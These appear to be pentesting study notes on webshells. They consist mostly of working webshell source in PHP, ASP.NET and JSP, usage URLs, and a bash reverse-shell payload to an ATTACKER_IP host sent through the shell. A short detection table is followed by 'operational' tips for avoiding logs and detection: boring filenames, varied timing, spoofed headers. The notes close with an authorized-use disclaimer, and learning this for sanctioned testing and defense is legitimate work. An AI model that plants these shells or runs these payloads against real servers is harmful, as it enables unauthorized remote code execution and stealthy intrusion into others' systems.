# 🐚 Webshells — Study Notes

## What is a Webshell?
A **webshell** is a server-side script (PHP, ASP, JSP, Python) that accepts commands via HTTP requests and executes them on the server. Output is returned as HTML.

**Why use webshells?**
- Bypass firewalls that block non-HTTP traffic
- Traffic blends in with normal web requests (HTTP/HTTPS)
- Useful when targeting internal web servers with no direct internet access

---

## Basic PHP Webshell

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

**Usage:**
```
http://target/uploads/shell.php?cmd=whoami
http://target/uploads/shell.php?cmd=id
http://target/uploads/shell.php?cmd=ls -la /var/www/html
```

---

## Enhanced Webshells

### POST-based (avoids GET logging)
```php
<?php
if ($_POST['cmd']) {
    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
}
?>
```

### Password-protected
```php
<?php
$password = "your_password_here";
if ($_POST['auth'] === $password && $_POST['cmd']) {
    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
} else if ($_POST['auth'] && $_POST['auth'] !== $password) {
    echo "Authentication failed";
}
?>
```

---

## Platform-Specific Webshells

### ASP.NET (Windows IIS)
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
}
%>
```

### JSP (Java Web Apps)
```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    out.println("<pre>");
    while ((line = reader.readLine()) != null) { out.println(line); }
    out.println("</pre>");
}
%>
```

---

## Upgrading Webshell → Full Reverse Shell

### Linux (Bash)
```
http://target/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261%27
```
Or with curl (auto URL-encodes):
```bash
curl "http://target/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
```

### Windows (PowerShell)
Pass the URL-encoded PowerShell reverse shell payload via `?cmd=`.

---

## Ready-made Webshells (Kali / AttackBox)

```bash
ls /usr/share/webshells/php/
# php-reverse-shell.php  ← most commonly used
```
> **PentestMonkey's `php-reverse-shell.php`** opens a direct reverse connection — gives a full interactive shell instead of one-command-at-a-time HTTP.

---

## Detection Vectors

| Vector | What's Detected |
|--------|----------------|
| **WAF** | Common webshell patterns in uploads/requests |
| **File Integrity Monitoring** | New/modified files in web directories |
| **Network Monitoring** | Unusual outbound connections from web server processes |
| **Log Analysis** | Command strings in GET params, unusual POST patterns |

---

## Operational Best Practices

| Area | Tip |
|------|-----|
| **File Placement** | Upload to expected upload directories; use boring filenames (e.g. `config.bak.php`) |
| **Access Patterns** | Vary timing; use realistic User-Agent and Referer headers |
| **Command Order** | Start with basic recon (`whoami`, `id`, `ls`) before noisy actions |
| **Cleanup** | Always remove the webshell after the engagement |

---

## Quick Reference

```
POST > GET          # Avoids command logging in URL/access logs
HTTPS traffic       # Harder to inspect, but connection pattern may still flag
Blend filenames     # config.php, upload_handler.php, etc.
```

> ⚠️ **For authorized penetration testing and educational purposes only.**
